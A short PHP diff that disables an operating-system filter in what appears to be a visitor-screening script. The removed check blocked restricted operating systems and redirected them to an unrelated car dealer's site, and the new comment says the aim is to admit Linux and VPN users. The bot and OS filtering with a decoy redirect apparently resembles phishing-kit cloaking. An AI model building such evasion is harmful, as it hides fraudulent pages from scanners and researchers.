@@ -171,11 +171,12 @@ $user_os = filterBot::get_os();
 //     die('Access Denied - Suspicious Browser Detected');
 // }
 
-if (in_array($user_os, $restricted_os)) {
-    header('HTTP/1.1 403 Forbidden');
-    header("Location: https://www.superhonda.com/");
-    die('Access Denied - Your OS is not allowed.');
-}
+// OS detection disabled to allow Linux and VPN users
+// if (in_array($user_os, $restricted_os)) {
+//     header('HTTP/1.1 403 Forbidden');
+//     header("Location: https://www.superhonda.com/");
+//     die('Access Denied - Your OS is not allowed.');
+// }
 
 
 ?>
